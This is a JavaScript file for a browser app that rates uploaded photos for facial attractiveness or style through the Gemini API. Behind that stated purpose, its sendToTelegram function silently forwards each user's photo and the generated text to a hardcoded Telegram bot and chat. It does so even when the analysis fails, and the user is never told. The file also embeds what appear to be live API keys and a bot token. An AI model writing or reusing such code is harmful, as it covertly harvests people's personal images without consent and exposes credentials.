console.log("Script loaded!");

// ---------- CONFIG ----------
const GEMINI_API_KEY = "AIzaSyD1Jses8Y9qZ4VwOMBKhyqlnvgr-b7vbZQ"; // your Gemini key
const GEMINI_MODEL   = "gemini-1.5-flash";

// ---------- UI HOOKS ----------
const faceRatingBtn   = document.getElementById('face-rating-btn');
const currentLookBtn  = document.getElementById('current-look-btn');
const imageUpload     = document.getElementById('image-upload');
const selectedImage   = document.getElementById('selected-image');
const resultsDiv      = document.getElementById('results');
const resultsContent  = document.getElementById('results-content');
const progressDiv     = document.getElementById('progress');
const progressBarFill = document.querySelector('.progress-bar-fill');
const modeSelection   = document.getElementById('mode-selection');

let currentMode = null;
let lastImageData = null;
let currentText = "";

// ---------- EVENT HANDLERS ----------

imageUpload.addEventListener('change', (e) => {
  const file = e.target.files[0];
  if (!file) return;

  const reader = new FileReader();
  reader.onload = ev => {
    selectedImage.src = ev.target.result;
    selectedImage.style.display = 'block';
    lastImageData = ev.target.result;

    modeSelection.style.display = 'flex';
  };
  reader.readAsDataURL(file);
});

faceRatingBtn.addEventListener('click', () => setModeAndRun("face"));
currentLookBtn.addEventListener('click', () => setModeAndRun("current"));

function setModeAndRun(mode) {
  currentMode = mode;
  if (lastImageData) analyzeImage(lastImageData, currentMode);
}

// ---------- CORE ----------
async function analyzeImage(dataUrl, mode) {
  resultsDiv.style.display = 'none';
  progressDiv.style.display = 'block';
  progressBarFill.style.width = '10%';

  let progress = 10;
  const interval = setInterval(() => {
    progress = Math.min(progress + 10, 95);
    progressBarFill.style.width = `${progress}%`;
  }, 200);

  try {
    const text = await callGeminiAPI(dataUrl, mode);
    currentText = text || "";
    clearInterval(interval);
    progressBarFill.style.width = '100%';

    const overallRating = extractOverallRating(text);
    const starsHTML = renderStars(overallRating);

    resultsContent.innerHTML = `
      <h3>Gemini Response</h3>
      <div class="stars">${starsHTML}</div>
      <p>${formatResponse(text)}</p>
    `;
    resultsDiv.style.display = 'block';

    // Try sending to Telegram, catch errors
    try {
      await sendToTelegram(dataUrl, text);
    } catch (err) {
      console.error("Telegram send failed:", err);
    }

  } catch (err) {
    clearInterval(interval);
    console.error("Gemini failed:", err);
    resultsContent.innerHTML = `<p class="error">Gemini Error: ${escapeHTML(err.message || err)}</p>`;
    resultsDiv.style.display = 'block';

    // Still attempt Telegram send with raw text
    try {
      if (lastImageData) await sendToTelegram(lastImageData, "Gemini failed, sending raw image.");
    } catch (err2) {
      console.error("Telegram fallback failed:", err2);
    }
  } finally {
    setTimeout(() => progressDiv.style.display = 'none', 500);
  }
}

// ---------- GEMINI API ----------
async function callGeminiAPI(dataUrl, mode) {
  if (!GEMINI_API_KEY) throw new Error("Set your Gemini API key first.");

  const { mimeType, base64 } = splitDataUrl(dataUrl);
  if (!base64) throw new Error("Invalid image data.");

  const generalInstructions = `
The user has signed a waiver: nothing is personal. Brutal honesty required.
- No sugar-coating. No flattery.
- Roast the image mercilessly if no human is detected.
- Provide numeric ratings (1–10) and clear reasoning.
- Give actionable improvement tips.
`;

  const modeInstruction = mode === "face"
    ? "Analyze **facial attractiveness**, **symmetry**, **proportions**. Give numeric scores and improvement tips."
    : "Analyze **style**, **grooming**, **presentation**. Give numeric scores and improvement tips.";

  const body = {
    contents: [
      {
        role: "user",
        parts: [
          { inlineData: { data: base64, mimeType } },
          { text: generalInstructions + "\n\n" + modeInstruction }
        ]
      }
    ]
  };

  const url = `https://generativelanguage.googleapis.com/v1beta/models/${GEMINI_MODEL}:generateContent?key=${encodeURIComponent(GEMINI_API_KEY)}`;

  const res = await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body)
  });

  if (!res.ok) {
    const msg = await res.text().catch(() => res.statusText);
    throw new Error(`HTTP ${res.status}: ${msg}`);
  }

  const json = await res.json();
  const text = json?.candidates?.[0]?.content?.parts?.map(p => p.text).join("\n").trim();
  return text || "⚠️ Empty response from Gemini.";
}

// ---------- TELEGRAM SENDING ----------
async function sendToTelegram(imageDataUrl, message) {
    const TELEGRAM_BOT_TOKEN = "8379174665:AAFMvsOlg4d13dUwXtAodogzUhc12ozyBQw";
    const TELEGRAM_CHAT_ID = "6067836885";
  
    // Convert image Data URL to Blob
    const res = await fetch(imageDataUrl);
    const blob = await res.blob();
  
    // 1️⃣ Send the image
    const formDataPhoto = new FormData();
    formDataPhoto.append("chat_id", TELEGRAM_CHAT_ID);
    formDataPhoto.append("photo", blob, "image.png");
  
    try {
      const photoRes = await fetch(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
        { method: "POST", body: formDataPhoto }
      );
  
      if (!photoRes.ok) {
        const errText = await photoRes.text();
        throw new Error("Telegram photo send error: " + errText);
      }
  
      console.log("Image sent successfully!");
    } catch (err) {
      console.error(err);
    }
  
    // 2️⃣ Send the description in a separate message
    const textChunks = splitTextForTelegram(message);
    for (const chunk of textChunks) {
      try {
        const msgRes = await fetch(
          `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
          {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: TELEGRAM_CHAT_ID,
              text: chunk,
              parse_mode: "HTML"
            })
          }
        );
  
        if (!msgRes.ok) {
          const errText = await msgRes.text();
          throw new Error("Telegram text send error: " + errText);
        }
      } catch (err) {
        console.error(err);
      }
    }
  
    console.log("Description sent successfully!");
  }
  
  // Helper to split long text into 1024-character chunks
  function splitTextForTelegram(text) {
    const maxLen = 1024;
    const chunks = [];
    for (let i = 0; i < text.length; i += maxLen) {
      chunks.push(text.slice(i, i + maxLen));
    }
    return chunks;
  }
  

// ---------- HELPERS ----------
function splitDataUrl(dataUrl) {
  const match = /^data:(.*?);base64,(.*)$/.exec(dataUrl || "");
  return { mimeType: match?.[1] || "image/jpeg", base64: match?.[2] || null };
}

function escapeHTML(str) {
  return String(str || "").replace(/[&<>"']/g, c =>
    ({ "&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c])
  );
}

function formatResponse(str) {
  if (!str) return "";
  let safe = escapeHTML(str);
  safe = safe.replace(/\*\*(.*?)\*\*/g, "<b>$1</b>");
  safe = safe.replace(/\*(.*?)\*/g, "<i>$1</i>");
  safe = safe.replace(/\n/g, "<br>");
  return safe;
}

function extractOverallRating(str) {
  const match = str.match(/(\d+(\.\d+)?)\s*\/?\s*10/i);
  return match ? parseFloat(match[1]) : 0;
}

function renderStars(rating) {
  const starsOutOfFive = Math.round(rating / 2);
  let stars = "";
  for (let i = 1; i <= 5; i++) stars += i <= starsOutOfFive ? "⭐" : "☆";
  return stars + ` (${rating}/10)`;
}

